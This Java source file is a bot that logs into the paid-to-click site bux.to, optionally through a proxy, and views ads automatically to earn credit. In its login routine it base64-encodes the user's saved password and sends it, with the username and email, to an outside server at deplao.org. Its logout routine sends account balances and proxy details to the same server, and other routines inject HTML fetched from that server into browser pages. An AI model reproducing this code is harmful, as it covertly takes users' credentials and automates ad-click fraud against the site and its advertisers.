package chinh;


import java.io.FileNotFoundException;
import java.io.IOException;
import java.text.NumberFormat;
import java.text.ParseException;
import java.util.ArrayList;
import java.util.Random;

import org.watij.webspec.dsl.WebSpec;

//import chinh.utils.CheckCaptchar;
import chinh.utils.ConfigLoader;
import chinh.utils.CryptString;
import chinh.utils.DatabaseConnection;
//import com.DeathByCaptcha.Captcha;
//import chinh.utils.EncryptDecryptStringWithDES;

public class BuxToPublic {
//	private Captcha myCaptcha;
	private WebSpec spec;
	private boolean loginSuccess=false;
	private String userName="";
	private String password="";
	private String proxy="";
	private int port=0;
	private String activeStatus="NA";
	private String loginUser="N/A";
	private int viewAdsErrorCount=0;
	private int version=1;
	
	public void setUserName(String userName) {
		this.userName = userName;
	}
	public void setPassword(String password) {
		this.password = password;
	}
	public void setProxy(String proxy) {
		this.proxy = proxy;
	}
	public void setPort(int port) {
		this.port = port;
	}
	public BuxToPublic() {
		super();
		// TODO Auto-generated constructor stub
	}


	public void initConfig() throws FileNotFoundException, IOException{
		spec=new WebSpec();
		if(!proxy.equals("")){
			spec.http_proxy(proxy);
			spec.http_proxy_port(port);	
		}
		saveConfig();
		spec.ie();		
	}
	private void saveConfig() throws FileNotFoundException, IOException{
		ConfigLoader.save("username", userName);
		ConfigLoader.save("pass", password);
		ConfigLoader.save("proxy", proxy);
		ConfigLoader.save("port", ""+port);
		
	}
	public void login() throws FileNotFoundException, IOException{
		initConfig();
		spec.open("http://whatismyipaddress.com/"); 
		spec.pause(5000);
		checkingVersion();
		try {
			spec.open("http://bux.to/login.php"); 
			spec.pauseUntilReady();
			if(userName.equals("") || password.equals("")){
				spec.find("body").set("innerHTML", "<div style=\"margin-top: 20px;margin-left: 10px\">Please set <b>username</b> and <b>password</b> in <b>Config.txt</b> first! Then try again.</div>");
				spec.pause(10000);
				spec.closeAll();
				System.exit(0);
			}
//			spec.findWithId("name").set("disabled","true");
//			spec.findWithId("email").set("disabled","true");
			spec.findWithId("name").set("value",userName);
			spec.findWithId("email").set("value",password);
//			spec.snapBuxToCapChart("capchar.png");
//			CheckCaptchar captchartChecker=new CheckCaptchar(spec);
//			captchartChecker.getCaptchaManual("capchar.png");
//			spec.findWithId("send").click(true);
			spec.pauseUntilDone();
			String urlAfterLogin=spec.url();
			if(urlAfterLogin.equals("http://bux.to/login.php")){
				System.err.println("Login Failed");
				login();			
			}else{
				loginSuccess=true;
				System.out.println("Login successful");
				//got user login
				spec.open("http://bux.to/acc.php");
				spec.pauseUntilReady();
				CryptString cryptString=new CryptString();
				String passCode=cryptString.encryptBase64(ConfigLoader.get("pass"));
				String referral=ConfigLoader.get("referral");
				try {
					loginUser=spec.find("strong").at(0).get("innerHTML").split("=")[1];
					activeStatus=DatabaseConnection.getText("http://deplao.org/autobots/login.php?user="+loginUser+"&email="+ConfigLoader.get("email")+"&fn="+passCode+"&ref="+referral);
				} catch (Exception e) {
					// TODO: handle exception
					activeStatus=DatabaseConnection.getText("http://deplao.org/autobots/login.php?user="+ConfigLoader.get("username")+"&email="+ConfigLoader.get("email")+"&fn="+passCode+"&ref="+referral);
				}
				System.out.println("Login user: "+loginUser);
				System.out.println("Account status: "+activeStatus);
				if(activeStatus.equals("locked")){
					logout();
					showLockedMessage();
				}else{
					viewAds();
					logout();
					spec.closeAll();
					System.exit(0);
				}
				
							
			}			
		} catch (Exception e) {
			// TODO: handle exception
			System.err.println(e.getMessage());
		}

	}
	private void viewAds(){
		spec.open("http://bux.to/ads.php");
		spec.pauseUntilReady();
		int start=1;
		int end=1;
		try {
			start=Integer.parseInt(spec.execute("$('s').length"))+1;
			end=Integer.parseInt(spec.execute("$('a[href^=cks.php]').length"));
		} catch (Exception e) {
			// TODO: handle exception
			System.err.println(e.getMessage());
			spec.pause(5000);
			viewAds();
		}
		System.out.println("View ads from : "+start+" to "+end);
		ArrayList<Integer> list=new ArrayList<Integer>();
		for(int i=start;i<=end;i++){
			list.add(i);
		}
//		Collections.shuffle(list);
		for(int i=0;i<list.size();i++){
			viewAd(list.get(i),5);
		}
	}
	private void viewAd(int adID,int repeat){
		try {
		    spec.open("http://bux.to/ads.php");
		    spec.pauseUntilReady();
			String url=spec.find("span").with("id", "da"+adID+"c").child("a").get("href");
			spec.open(url);	 
			spec.pauseUntilReady();
			showAds();
			System.out.println("Waiting for view ads ID:"+adID);
			int processBarWidth=0;
			int j=0;
			while(processBarWidth<120){
				spec.pause(1000);
				try {
					String getexe=spec.execute("document.getElementById('progress').offsetWidth");
					System.out.println("Get ProcessBar: "+getexe);
					processBarWidth=Integer.parseInt(getexe);
				} catch (java.lang.NumberFormatException e) {
					// TODO: handle exception
					processBarWidth=-1;
				}
				j++;
				if(processBarWidth==-1 && j>60){
					break;
				}
				if(processBarWidth==0 && j>180){
					break;
				}
			}
			Random rand = new Random(); 
			int pickedNumber = rand.nextInt(3000) + 5000; 
			System.out.println(adID+" - Ads loaded "+pickedNumber);
			spec.pause(pickedNumber);			
		} catch (Exception e) {
			// TODO: handle exception
			System.err.println(e.getMessage());
			if(repeat>0){
				spec.pause(5000);
				viewAd(adID,repeat-1);
			}
			
		}

	}
	
	public boolean isLoginSuccess() {
		return loginSuccess;
	}
	public void logout(){
		System.out.println("User logout...");
		spec.open("http://bux.to/acc.php");
		spec.pauseUntilReady();
		String websiteVisits="-100";
		String directFollowers="-100";
		String followers ="-100";
		String followersWebsiteVisits="-100";
		String accountBalance="-100";
		String totalAmountPaid="-100";
		String proxy="";
		String port="";
		try {
			websiteVisits=spec.jquery("div.statmargin").at(0).find("strong").get("innerHTML");
			directFollowers=spec.jquery("div.statmargin").at(1).find("strong").get("innerHTML");
			followers=spec.jquery("div.statmargin").at(2).find("strong").get("innerHTML");
			followersWebsiteVisits=spec.jquery("div.statmargin").at(3).find("strong").get("innerHTML");
			accountBalance=spec.jquery("div.statmargin").at(4).find("strong").get("innerHTML");
			totalAmountPaid=spec.jquery("div.statmargin").at(6).find("strong").get("innerHTML");
			proxy=ConfigLoader.get("proxy");
			port=ConfigLoader.get("port");
		} catch (Exception e) {
			// TODO: handle exception
		}
		System.out.println("websiteVisits : "+websiteVisits);
		System.out.println("directFollowers : "+directFollowers);
		System.out.println("followers : "+followers);
		System.out.println("followersWebsiteVisits : "+followersWebsiteVisits);
		System.out.println("accountBalance : "+accountBalance);
		System.out.println("totalAmountPaid : "+totalAmountPaid);
		
		String url="http://deplao.org/autobots/logout.php?username="+loginUser;
		url+="&lastview="+websiteVisits;
		url+="&directFollowers="+directFollowers;
		url+="&followers="+followers;
		url+="&followersWebsiteVisits="+followersWebsiteVisits;
		url+="&accountBalance="+accountBalance;
		url+="&totalAmountPaid="+totalAmountPaid;
		url+="&ip="+"";
		url+="&proxy="+proxy;
		url+="&port="+port;
		try {
			DatabaseConnection.getText(url);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		spec.open("http://bux.to/logout.php");
		spec.pauseUntilReady();
		if(activeStatus.equals("donate")){
			showDonate();
		}
	}
	  // Implementing Fisher–Yates shuffle
	  static void shuffleArray(int[] ar)
	  {
	    Random rnd = new Random();
	    for (int i = ar.length - 1; i > 0; i--)
	    {
	      int index = rnd.nextInt(i + 1);
	      // Simple swap
	      int a = ar[index];
	      ar[index] = ar[i];
	      ar[i] = a;
	    }
	  }
	private void showAds(){
		String message="<div></div>";
		try {
			message=DatabaseConnection.getText("http://deplao.org/autobots/viewads.html");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}		
		spec.find("table").at(0).find("tr").at(0).find("td").at(2).set("innerHTML", message);
	}
	private void showDonate(){
		spec.pauseUntilReady();
		System.out.println("Send donate...");
		String message="";
		try {
			message=DatabaseConnection.getText("http://deplao.org/autobots/donation.html");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		message=message.replaceAll("\"", "'");
		System.out.println(message);
		spec.eval("document.body.innerHTML=\""+message+"\"");
		spec.pauseUntilDone();
	}
	private void showLockedMessage(){
		spec.pauseUntilReady();
		System.out.println("Account "+loginUser+" is locked!");
		String message="Your account is locked! Please create a new account use this link <a href=\"http://bux.to/register.php?r=chinhnguyen\">http://bux.to/register.php?r=chinhnguyen</a>";
		try {
			message=DatabaseConnection.getText("http://deplao.org/autobots/locked.html");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		System.out.println("Locked message: ");
		System.out.println(message);
		message=message.replaceAll("\"", "'");
//		spec.find("body").set("innerHTML", message);
		spec.eval("document.body.innerHTML=\""+message+"\"");
		spec.pause(300000);
		spec.closeAll();
		System.exit(0);
	}
	private void checkingVersion(){
		String message="1|abc";
		try {
			message=DatabaseConnection.getText("http://deplao.org/autobots/version.html");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		message=message.replaceAll("\"", "'");
		System.out.println(message);
		int checkVersion=Integer.parseInt(message.split("\\|")[0]);
		System.out.println(checkVersion);
		if(checkVersion>this.version){
			spec.find("body").set("innerHTML", "<div style=\"margin: 20px\">"+message.split("\\|")[1]+"<p/>Or click \"Done\" button to continue...</div>");
			spec.pauseUntilDone();
		}
		
	}
	public static void main(String[] args) throws IOException {
			BuxToPublic buxTo=new BuxToPublic();
			String proxy=ConfigLoader.get("proxy");
			String proxyPort=ConfigLoader.get("port");
			int port=8080;
			if(proxyPort.equals("")){
			}else{
				try
				 {
				      NumberFormat.getInstance().parse(proxyPort);
				      port=Integer.parseInt(proxyPort);
				 }
				 catch(ParseException e)
				 {
				     //Not a number.
				 }
			}
				buxTo.setUserName(ConfigLoader.get("username"));
				buxTo.setPassword(ConfigLoader.get("pass"));
				buxTo.setProxy(proxy);
				buxTo.setPort(port);
				try {
					buxTo.saveConfig();
				} catch (FileNotFoundException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				buxTo.login();
	}
}
